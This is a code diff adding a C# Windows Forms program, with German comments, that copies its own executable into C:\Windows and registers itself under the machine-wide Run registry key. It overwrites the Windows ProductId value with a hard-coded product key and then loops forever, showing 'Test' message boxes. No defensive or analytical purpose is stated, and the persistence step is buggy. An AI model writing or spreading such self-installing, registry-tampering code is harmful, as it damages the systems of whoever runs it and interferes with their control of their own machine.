@@ -1,0 +1,72 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using Microsoft.Win32;
+using System.IO;
+using System.Threading;
+
+/*
+    Programm backup Ordner = C:\Windows\System32
+    Speicherort Key = Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion ---- ProductId
+    Key = 00280-80234-10049-AA435
+
+*/
+
+namespace tsdb
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            string runKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
+            string keypfad = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion";
+            string pidname = "ProductId";
+            string ausführungspfad = Application.ExecutablePath.ToString();
+            string backupdatei = @"C:\Windows\tsdb.exe";
+            string backuppfad = @"C:\Windows\";
+            string fileName = "tsdb.exe";
+            string backupdateiinfo = System.IO.Path.Combine(backuppfad, fileName);
+            string key = "00280-80234-10049-AA435";
+            bool an = true;
+
+            while (an == true)
+            {
+                if (!File.Exists(backupdatei))
+                {
+                    /*Datei in backuppfad einfügen + Autostart einfügen*/
+                    System.IO.File.Copy(ausführungspfad, backupdateiinfo);
+                    RegistryKey startkey = Registry.LocalMachine.OpenSubKey(runKey);
+                    startkey.Close();
+                    startkey = Registry.LocalMachine.OpenSubKey(runKey, true);
+                    startkey.SetValue(fileName, backuppfad);
+                }
+                else
+                {
+                    RegistryKey pid = Registry.LocalMachine.OpenSubKey(keypfad);
+                    pid.Close();
+                    pid = Registry.LocalMachine.OpenSubKey(keypfad, true);
+                    pid.SetValue(pidname, key);
+                }
+                Thread.Sleep(500);
+                MessageBox.Show("Test");
+                Thread.Sleep(500);
+                MessageBox.Show("Test");
+                Thread.Sleep(500);
+                MessageBox.Show("Test");
+                Thread.Sleep(500);
+                MessageBox.Show("Test");
+            }
+        }
+    }
+}
